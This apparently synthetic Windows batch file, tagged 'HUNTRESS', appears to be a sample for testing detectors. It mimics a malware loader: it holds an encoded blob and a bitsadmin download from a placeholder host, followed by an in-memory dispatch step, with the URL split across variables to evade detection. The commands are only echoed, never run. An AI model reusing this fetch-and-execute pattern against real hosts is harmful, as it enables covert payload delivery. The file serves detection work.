@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:reversed_text|rotate_left

rem HUNTRESS-MATERIAL:==A6CjMXuBHbkZscqZsXILN2CzO3SzlyYDu2CDvycxmcMrmboRGYkxmXeRn5gjO6QrH2krO+sJHzq5GakBGZspF3OLtwgrtwGrHyS7L3OLtwgrtwGjvyc7N36pszCruzcLM2+iO8KzN+Izt3aLs0IrH0gLM5OjvY6hO3q7tx+qszCju54rM8KzF3SrNyCbO6STsekrM6gLMyCjv8k7t2KrtvQbM6CDu5SjMWKju3arM5+qM5Sru4GLsemDuyobO+ipH7

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

SeT "item0=v=1|steps=acquire_remote,dispatch_memory|adapter="
SeT "item1=bitsadmin.exe|stage_count=1|graph=diamond|next_la"
SeT "item2=nguage=none|campaign_id=campaign-6202475f96|url=h"
SeT "item3=ttps://6202475f96.example.invalid/c59c2687.dat"

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_arithmetic=17386265"

set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "item9=%%item0%%%%item1%%%%item2%%%%item3%%"

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe GET https://6202475f96.example.invalid/c59c2687.dat then dispatch memory

exit /b 0

